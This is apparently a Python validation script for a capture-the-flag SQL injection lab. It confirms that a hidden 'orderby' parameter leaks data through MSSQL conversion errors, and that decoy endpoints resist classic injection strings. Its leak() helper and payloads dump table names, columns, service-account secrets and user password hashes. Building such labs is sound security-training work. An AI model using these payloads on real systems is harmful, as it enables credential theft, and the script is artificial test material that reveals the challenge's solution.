import html
import re
import sys

import requests

BASE = sys.argv[1].rstrip("/")
D = BASE + "/desk"
FLAG = re.compile(r"FLAG\{ticketdesk_[a-z_0-9]+\}")
VER = re.compile(r"Microsoft SQL Server 20\d\d")
HINTS = re.compile(r"\b(sql|inject\w*|vulnerable|flag|lab|hint|debug|mysql|mssql)\b", re.I)
# Things that must never be referenced in anything the site serves.
HIDDEN = ["orderby", "/desk/api/assets", "/desk/api/categories", "/desk/api/users", "/desk/api/export",
          "/desk/api/health", "/desk/api/reports", "/desk/api/config", "/desk/api/internal", "/desk/api/v1",
          "/desk/admin", "/desk/backup"]
HIDDEN_PATHS = ["/api/assets", "/api/categories", "/api/users", "/api/export", "/api/health", "/api/reports", "/api/config"]


def step(name, ok):
    print(f"{name}: {'PASS' if ok else 'FAIL'}")


def tickets(**params):
    return requests.get(D + "/api/tickets", params=params, timeout=20)


def leak(expr):
    """Send expr as the ordering expression and pull the converted value out of the error detail."""
    r = tickets(orderby=expr)
    try:
        d = r.json().get("detail", "")
    except ValueError:
        return ""
    m = re.search(r"value '(.*)' to data type int", d, re.S)
    return m.group(1) if m else ""


def crawl():
    seen, todo, pages = set(), ["/desk/"], {}
    while todo and len(seen) < 120:
        u = todo.pop()
        if u in seen:
            continue
        seen.add(u)
        r = requests.get(BASE + u, timeout=20)
        pages[u] = r.text
        refs = [html.unescape(h) for h in re.findall(r'href="([^"#]+)"', r.text)]
        refs += re.findall(r"""['"](/desk/[A-Za-z0-9_/.?=&%-]*)['"]""", r.text)
        for h in refs:
            if h.startswith("/desk") and h not in seen:
                todo.append(h)
    return pages


def main():
    # ---- site shape
    pages = crawl()
    blob = "\n".join(pages.values())
    step("site-crawl", len(pages) >= 12)
    shells = "\n".join(v for k, v in pages.items() if "/api/" not in k)
    step("site-no-auth-surface", 'type="password"' not in blob and not re.search(r"sign.?in|log.?in|sign.?up|register|bearer|authorization", shells, re.I))
    step("site-no-hint-words", not HINTS.search(blob))
    step("site-no-comments", "<!--" not in blob)
    step("site-robots-sitemap-absent", requests.get(BASE + "/desk/robots.txt", timeout=15).status_code == 404
         and requests.get(BASE + "/desk/sitemap.xml", timeout=15).status_code == 404)
    step("site-hidden-not-referenced", not any(h in blob for h in HIDDEN))
    step("site-visible-endpoints-referenced", all(x in blob for x in ("/desk/api/tickets", "/desk/api/ticket?id=", "/desk/api/kb", "/desk/api/agents", "/desk/api/stats")))

    # ---- hidden parameter: found by fuzzing parameter names (response differs when present)
    base = tickets()
    other = tickets(foo="1")
    step("param-baseline-ok", base.status_code == 200 and "items" in base.json())
    step("param-unknown-ignored", other.status_code == 200 and len(other.content) == len(base.content))
    a, b = tickets(orderby="1"), tickets(orderby="test")
    step("param-hidden-differs-numeric", a.status_code == 200 and len(a.content) != len(base.content))
    step("param-hidden-differs-word", b.status_code != base.status_code or len(b.content) != len(base.content))
    r = tickets(status="open", page="1")
    step("param-visible-status-page-work", r.status_code == 200 and r.json()["total"] > 0)
    for q in ({"status": "zzz"}, {"q": "a'"}, {"priority": "9"}, {"page": "x"}):
        r = tickets(**q)
        step(f"detail-hidden-without-param-{next(iter(q))}", r.status_code == 400 and "detail" not in r.text)

    # ---- hidden parameter: ORDER BY error-based (UNION impossible)
    step("orderby-union-blocked", tickets(orderby="1 union select 1").status_code == 400)
    step("orderby-comment-blocked", tickets(orderby="1--").status_code == 400)
    v = leak("CAST(@@version AS int)")
    step("orderby-error-version", bool(VER.search(v)))
    step("orderby-error-database", leak("CAST(DB_NAME() AS int)") == "ticketdesk")
    t = leak("CAST((SELECT STRING_AGG(name,CHAR(44)) FROM sys.tables) AS int)")
    step("orderby-error-tables", all(x in t for x in ("service_accounts", "users", "tickets", "knowledge_base")))
    t = leak("CAST((SELECT STRING_AGG(name,CHAR(44)) FROM sys.columns WHERE object_id=OBJECT_ID('service_accounts')) AS int)")
    step("orderby-error-columns", "secret" in t and "system_name" in t and "account" in t)
    t = leak("CAST((SELECT STRING_AGG(column_name,CHAR(44)) FROM information_schema.columns WHERE table_name='service_accounts') AS int)")
    step("orderby-error-columns-infoschema", "secret" in t and "system_name" in t)
    t = leak("CAST((SELECT STRING_AGG(CONCAT(system_name,CHAR(58),account,CHAR(58),secret),CHAR(124)) FROM service_accounts) AS int)")
    step("orderby-error-dump-flag", bool(FLAG.search(t)) and "svc_join" in t)
    t = leak("CAST((SELECT STRING_AGG(CONCAT(username,CHAR(58),password_hash),CHAR(124)) FROM users) AS int)")
    step("orderby-error-dump-rows", "admin:" in t)
    t = leak("(SELECT TOP 1 CAST(secret AS int) FROM service_accounts WHERE account='svc_join')")
    step("orderby-error-single-row", bool(FLAG.search(t)))

    # ---- hidden endpoints exist and look different from a missing path
    miss = requests.get(D + "/api/zzqx", timeout=15)
    step("hidden-missing-is-404", miss.status_code == 404)
    for path in HIDDEN_PATHS:
        r = requests.get(D + path, timeout=15)
        step(f"hidden-endpoint-present{path.replace('/', '-')}", r.status_code != 404 and r.content != miss.content)
    step("hidden-admin-403", requests.get(D + "/admin", timeout=15).status_code == 403)

    # ---- visible decoys must not be injectable
    r = requests.get(D + "/api/ticket", params={"id": "3"}, timeout=15)
    step("decoy-ticket-baseline", r.status_code == 200 and r.json().get("id") == 3)
    r = requests.get(D + "/api/ticket", params={"id": "3'"}, timeout=15)
    step("decoy-ticket-quote", r.status_code == 400 and "detail" not in r.text)
    r = requests.get(D + "/api/ticket", params={"id": "3 or 1=1"}, timeout=15)
    step("decoy-ticket-numeric", r.status_code == 400)
    r = requests.get(D + "/api/ticket", params={"id": "999"}, timeout=15)
    step("decoy-ticket-missing", r.status_code == 404)
    r = requests.get(D + "/api/kb", params={"q": "x' union select 1,@@version,3,4--"}, timeout=15)
    step("decoy-kb-union", r.status_code == 200 and r.json()["items"] == [] and "Microsoft" not in r.text)
    r = requests.get(D + "/api/kb", params={"q": "' or '1'='1"}, timeout=15)
    step("decoy-kb-bypass", r.status_code == 200 and r.json()["items"] == [])
    r = requests.get(D + "/api/kb", params={"q": "'"}, timeout=15)
    step("decoy-kb-quote-no-error", r.status_code == 200 and "detail" not in r.text)
    r = requests.get(D + "/api/agents", params={"team": "x' or '1'='1"}, timeout=15)
    step("decoy-agents-bypass", r.status_code == 200 and r.json()["items"] == [])
    r = requests.get(D + "/api/agents", params={"team": "Network' union select 1,2,3,4--"}, timeout=15)
    step("decoy-agents-union", r.status_code == 200 and r.json()["items"] == [])
    r = requests.get(D + "/api/agents", params={"team": "Network"}, timeout=15)
    step("decoy-agents-baseline", r.status_code == 200 and len(r.json()["items"]) == 2)
    for p in ("7d' or 1=1--", "7d;", "x"):
        r = requests.get(D + "/api/stats", params={"period": p}, timeout=15)
        step(f"decoy-stats-period-{len(p)}", r.status_code == 400 and "detail" not in r.text)
    r = requests.get(D + "/api/stats", params={"period": "7d"}, timeout=15)
    step("decoy-stats-baseline", r.status_code == 200 and "by_status" in r.json())
    for q in ({"status": "open' or '1'='1"}, {"priority": "1 or 1=1"}, {"q": "a' or '1'='1"}, {"page": "1;"}):
        r = tickets(**q)
        step(f"decoy-tickets-{next(iter(q))}", r.status_code == 400 and "detail" not in r.text)

    # ---- hidden decoys must not be injectable
    r = requests.get(D + "/api/assets", params={"sort": "1"}, timeout=15)
    step("decoy-assets-sort-whitelist", r.status_code == 400 and "detail" not in r.text)
    r = requests.get(D + "/api/assets", params={"sort": "CAST(@@version AS int)"}, timeout=15)
    step("decoy-assets-sort-error", r.status_code == 400 and "Microsoft" not in r.text)
    r = requests.get(D + "/api/assets", params={"tag": "x' or '1'='1"}, timeout=15)
    step("decoy-assets-tag", r.status_code == 200 and r.json()["items"] == [])
    r = requests.get(D + "/api/users", params={"id": "1 or 1=1"}, timeout=15)
    step("decoy-users-id", r.status_code == 400)
    r = requests.get(D + "/api/users", params={"id": "2"}, timeout=15)
    step("decoy-users-baseline", r.status_code == 200 and "password" not in r.text)
    r = requests.get(D + "/api/export", params={"id": "1'", "format": "csv"}, timeout=15)
    step("decoy-export-id", r.status_code == 400 and "detail" not in r.text)
    r = requests.get(D + "/api/export", params={"id": "1", "format": "json'"}, timeout=15)
    step("decoy-export-format", r.status_code == 400)
    step("decoy-reports-403", requests.get(D + "/api/reports", timeout=15).status_code == 403)
    step("decoy-config-403", requests.get(D + "/api/config", timeout=15).status_code == 403)
    step("decoy-internal-403", requests.get(D + "/api/internal/x", timeout=15).status_code == 403)
    step("decoy-v1-410", requests.get(D + "/api/v1/tickets", timeout=15).status_code == 410)
    step("deadend-no-login-endpoints", requests.post(D + "/api/auth/login", json={"username": "a", "password": "b"}, timeout=15).status_code in (404, 405)
         and requests.post(D + "/api/auth/register", json={}, timeout=15).status_code in (404, 405))

    # ---- no hint leak in normal errors
    r = requests.get(D + "/api/tickets", params={"status": "open", "orderby": "t.id"}, timeout=15)
    step("orderby-valid-expression-works", r.status_code == 200 and r.json()["items"][0]["id"] < r.json()["items"][-1]["id"])


main()
